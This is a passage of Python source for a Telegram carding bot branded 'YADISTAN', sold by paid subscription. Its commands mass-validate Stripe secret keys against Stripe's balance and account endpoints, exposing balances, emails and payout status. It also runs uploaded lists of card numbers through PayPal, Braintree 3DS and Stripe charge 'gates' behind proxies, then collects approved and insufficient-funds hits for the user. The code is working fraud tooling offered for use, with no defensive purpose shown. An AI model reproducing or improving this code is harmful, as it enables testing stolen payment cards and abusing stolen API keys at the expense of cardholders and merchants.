                else:               dead += 1
                results_lines.append(f"{emoji} <code>{cc_short}</code> → {result}")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_skm_msg(), reply_markup=skb)
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(_skm_check_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False); break
                try: fut.result()
                except Exception: pass

        stopped = stopuser.get(f'{id}', {}).get('status') == 'stop'
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_skm_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗" if stopped else "✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=kb)
        except Exception:
            pass
    threading.Thread(target=my_function).start()

# ================== /skchk — SK Key Validator ==================
@bot.message_handler(commands=["skchk"])
def skchk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        try:
            sk_key = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message, "<b>🔑 𝗦𝗞 𝗞𝗲𝘆 𝗩𝗮𝗹𝗶𝗱𝗮𝘁𝗼𝗿\n\n𝗨𝘀𝗮𝗴𝗲:\n/skchk sk_live_xxxxxx</b>")
            return
        if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗞𝗲𝘆 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝘀𝗸_𝗹𝗶𝘃𝗲_ 𝗼𝗿 𝘀𝗸_𝘁𝗲𝘀𝘁_</b>")
            return
        msg = bot.reply_to(message, "<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝗞 𝗞𝗲𝘆... ⏳</b>")
        start_time = time.time()
        try:
            # /v1/balance — live/dead + amount info (like reference tool)
            bal_resp = requests.get(
                'https://api.stripe.com/v1/balance',
                auth=(sk_key, ''),
                timeout=15
            )
            bal_data = bal_resp.json()
            execution_time = time.time() - start_time

            if '"available"' in bal_resp.text and bal_resp.status_code == 200:
                # Key is LIVE — extract balance details
                avail_list  = bal_data.get('available', [{}])
                amount      = avail_list[0].get('amount', 0) if avail_list else 0
                currency    = avail_list[0].get('currency', 'usd').upper() if avail_list else 'N/A'
                livemode    = bal_data.get('livemode', False)

                # determine balance status
                if int(amount) > 0:
                    balance_status = f"✅ 𝗣𝗼𝘀𝗶𝘁𝗶𝘃𝗲 ({amount/100:.2f} {currency})"
                    status_emoji   = "✅"
                    status_text    = "𝗟𝗜𝗩𝗘 🟢"
                elif int(amount) == 0:
                    balance_status = f"⚠️ 𝗭𝗲𝗿𝗼 (0.00 {currency})"
                    status_emoji   = "⚠️"
                    status_text    = "𝗟𝗜𝗩𝗘 (𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝟬) 🟡"
                else:
                    balance_status = f"⛔ 𝗡𝗲𝗴𝗮𝘁𝗶𝘃𝗲 ({amount/100:.2f} {currency})"
                    status_emoji   = "⚠️"
                    status_text    = "𝗟𝗜𝗩𝗘 (𝗡𝗲𝗴𝗮𝘁𝗶𝘃𝗲) 🔴"

                # also fetch /v1/account for extra details
                try:
                    acc_resp = requests.get(
                        'https://api.stripe.com/v1/account',
                        auth=(sk_key, ''),
                        timeout=10
                    )
                    acc_data = acc_resp.json() if acc_resp.status_code == 200 else {}
                except:
                    acc_data = {}

                acct_id  = acc_data.get('id', 'N/A')
                email    = acc_data.get('email', 'N/A')
                country  = acc_data.get('country', 'N/A')
                charges  = acc_data.get('charges_enabled', False)
                payouts  = acc_data.get('payouts_enabled', False)

                details = (
                    f"[ϟ] 𝗔𝗰𝗰𝗼𝘂𝗻𝘁: <code>{acct_id}</code>\n"
                    f"[ϟ] 𝗘𝗺𝗮𝗶𝗹: {email}\n"
                    f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n"
                    f"[ϟ] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: {currency}\n"
                    f"[ϟ] 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance_status}\n"
                    f"[ϟ] 𝗟𝗶𝘃𝗲𝗺𝗼𝗱𝗲: {'✅ Yes' if livemode else '🔸 Test'}\n"
                    f"[ϟ] 𝗖𝗵𝗮𝗿𝗴𝗲𝘀: {'✅' if charges else '❌'}\n"
                    f"[ϟ] 𝗣𝗮𝘆𝗼𝘂𝘁𝘀: {'✅' if payouts else '❌'}"
                )
            else:
                err_msg      = bal_data.get('error', {}).get('message', 'Invalid Key')
                status_emoji = "❌"
                status_text  = "𝗗𝗘𝗔𝗗 🔴"
                details      = f"[ϟ] 𝗥𝗲𝗮𝘀𝗼𝗻: {err_msg[:100]}"

        except Exception as e:
            execution_time = time.time() - start_time
            status_emoji = "⚠️"
            status_text  = "𝗘𝗿𝗿𝗼𝗿"
            details = f"[ϟ] 𝗘𝗿𝗿𝗼𝗿: {str(e)[:100]}"

        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text=f"""<b>#SK_Checker 🔑
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗦𝗞: <code>{sk_key[:20]}...***</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {status_text} {status_emoji}
- - - - - - - - - - - - - - - - - - - - - - -
{details}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>""",
            reply_markup=kb)
    threading.Thread(target=my_function).start()

# ================== /msk — Mass SK Key Checker ==================
@bot.message_handler(commands=["msk"])
def msk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # Extract all SK keys from anywhere in the message (handles concatenated keys too)
        _sk_re_msk = re.compile(r'sk_(?:live|test)_[A-Za-z0-9]+')
        full_text   = message.text or ''
        # Remove the /msk command part before scanning
        full_text   = re.sub(r'^/msk\S*\s*', '', full_text, count=1).strip()
        sk_keys     = list(dict.fromkeys(_sk_re_msk.findall(full_text)))  # unique, order preserved
        if not sk_keys:
            bot.reply_to(message,
                "<b>🔑 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n\n"
                "𝗨𝘀𝗮𝗴𝗲:\n"
                "<code>/msk\n"
                "sk_live_key1\n"
                "sk_live_key2\n"
                "sk_live_key3</code></b>",
                parse_mode='HTML')
            return
        if len(sk_keys) > 30:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 30 𝗸𝗲𝘆𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(sk_keys)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>🔑 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗸𝗲𝘆𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        live = dead = checked = 0
        results_lines = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = f"<b>🔑 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n{status}\n━━━━━━━━━━━━━━━━━━━━\n"
            h += f"📊 {checked}/{total} | ✅ {live} | ❌ {dead}\n━━━━━━━━━━━━━━━━━━━━\n"
            return h + "\n".join(results_lines[-15:]) + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
        for sk in sk_keys:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                except:
                    pass
                return
            start_time = time.time()
            try:
                r = requests.get(
                    'https://api.stripe.com/v1/balance',
                    auth=(sk, ''),
                    timeout=12
                )
                data = r.json()
                if '"available"' in r.text and r.status_code == 200:
                    avail = data.get('available', [{}])
                    amount = avail[0].get('amount', 0) if avail else 0
                    currency = avail[0].get('currency', 'usd').upper() if avail else 'N/A'
                    livemode = '✅' if data.get('livemode') else '🔸Test'
                    bal_str = f"{amount/100:.2f} {currency}"
                    result_text = f"𝗟𝗜𝗩𝗘 | Bal:{bal_str} | Live:{livemode}"
                    status_emoji = "✅"; live += 1
                else:
                    err = data.get('error', {}).get('message', 'Invalid')[:40]
                    result_text = f"𝗗𝗲𝗮𝗱 | {err}"
                    status_emoji = "❌"; dead += 1
            except Exception as e:
                result_text = f"𝗘𝗿𝗿𝗼𝗿 | {str(e)[:40]}"
                status_emoji = "⚠️"; dead += 1
            checked += 1
            sk_short = sk[:18] + '...***'
            results_lines.append(f"{status_emoji} <code>{sk_short}</code> → {result_text}")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=kb)
        except:
            pass
    threading.Thread(target=my_function).start()

@bot.message_handler(content_types=["document"])
def main(message):
        name = message.from_user.first_name
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        id=message.from_user.id
        
        try:BL=(json_data[str(id)]['plan'])
        except:
            BL='𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            with open("data.json", 'r', encoding='utf-8') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                str(id) : {
      "plan": "𝗙𝗥𝗘𝗘",
      "timer": "none",
                }
            }
    
            existing_data.update(new_data)
            with _DATA_LOCK:
                with open("data.json", 'w', encoding='utf-8') as json_file:
                    json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text=f'''<b>🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌟

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『yadistan』</b>
''',reply_markup=keyboard)
            return
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
            date_str=json_data[str(id)]['timer'].split('.')[0]
        try:
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
        except Exception as e:
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text=f'''<b>🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌟

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『YADISTAN』</b>
''',reply_markup=keyboard)
            return
        current_time = datetime.now()
        required_duration = timedelta(hours=0)
        if current_time - provided_time > required_duration:
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>
                ''',reply_markup=keyboard)
            with open("data.json", 'r', encoding='utf-8') as file:
                json_data = json.load(file)
            json_data[str(id)]['timer'] = 'none'
            json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
            with open("data.json", 'w', encoding='utf-8') as file:
                json.dump(json_data, file, indent=2)
            return
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        paypal_button = types.InlineKeyboardButton(text="𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ☑️", callback_data='pp_file')
        passed_button = types.InlineKeyboardButton(text="𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 🔥", callback_data='passed_file')
        stripe_charge_button = types.InlineKeyboardButton(text="𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 💳", callback_data='stripe_charge_file')
        stripe_auth_button = types.InlineKeyboardButton(text="𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 🔐", callback_data='stripe_auth_file')
        keyboard.add(paypal_button, passed_button, stripe_charge_button, stripe_auth_button)

        bot.reply_to(message, text=f'𝗖𝗵𝗼𝗼𝘀𝗲 𝗧𝗵𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗬𝗼𝘂 𝗪𝗮𝗻𝘁 𝗧𝗼 𝗨𝘀𝗲',reply_markup=keyboard)
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        with open("combo.txt", "wb") as w:
            w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data == 'pp_file')
def menu_callback_pp(call):
    def my_function():
        id=call.from_user.id
        gate='𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆'
        dd = 0
        live = 0
        risk = 0
        ccnn = 0
        insufficient = 0
        live_cards = []
        insuf_cards = []
        
        user_amount = get_user_amount(id)
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗣𝗮𝘆𝗣𝗮𝗹...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = paypal_gate(cc, user_amount, proxy)
                    execution_time = time.time() - start_time
                    
                    # ✅ APPROVED CARDS - collect
                    if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ INSUFFICIENT FUNDS CARDS - collect
                    elif "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀" in last:
                        insufficient += 1
                        insuf_cards.append(f"💰 <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ❌ DECLINED CARDS
                    elif 'risk' in last.lower():
                        risk+=1
                    elif '𝗖𝗩𝗩' in last:
                        ccnn+=1
                    else:
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
💵 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        if live_cards or insuf_cards:
            all_hits = live_cards + insuf_cards
            hits_text = f"<b>💳 #pp_Gateway ${user_amount} — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'passed_file')
def menu_callback_passed(call):
    def my_function():
        id=call.from_user.id
        gate='𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆'
        dd = 0
        live = 0
        risk = 0
        ccnn = 0
        challenge = 0
        live_cards = []
        
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗣𝗮𝘀𝘀𝗲𝗱...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $2.00")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = passed_gate(cc, proxy)
                    execution_time = time.time() - start_time
                    
                    # فقط "3DS Authenticate Attempt Successful" - collect
                    if "3DS Authenticate Attempt Successful" in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    elif "3DS Challenge Required" in last:
                        challenge += 1
                    elif 'risk' in last.lower():
                        risk += 1
                    elif 'CVV' in last:
                        ccnn += 1
                    else:
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗩𝗕𝗩
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {live}
⚠️ 𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲: {challenge}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗩𝗕𝗩
━━━━━━━━━━━━━━━━━
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {live}
⚠️ 𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲: {challenge}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        if live_cards:
            hits_text = f"<b>🛡️ #vbv_Gateway $2.00 — 𝗛𝗶𝘁𝘀 [{len(live_cards)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(live_cards)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stripe_charge_file')
def menu_callback_stripe_charge(call):
    def my_function():
        id=call.from_user.id
        gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲'
        dd = 0
        live = 0
        risk = 0
        ccnn = 0
        insufficient = 0
        live_cards = []
        insuf_cards = []
        
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $1.00")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = stripe_charge(cc, proxy)
                    execution_time = time.time() - start_time
                    
                    # ✅ CHARGE SUCCESS - collect
                    if "Charge !!" in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ INSUFFICIENT FUNDS - collect
                    elif "Insufficient Funds" in last:
                        insufficient += 1
                        insuf_cards.append(f"💰 <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ❌ DECLINED CARDS
                    elif 'Declined' in last:
                        dd += 1
                    elif 'Incorrect' in last:
                        ccnn += 1
                    else:
                        risk += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
💵 𝗔𝗺𝗼𝘂𝗻𝘁: $1.00
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
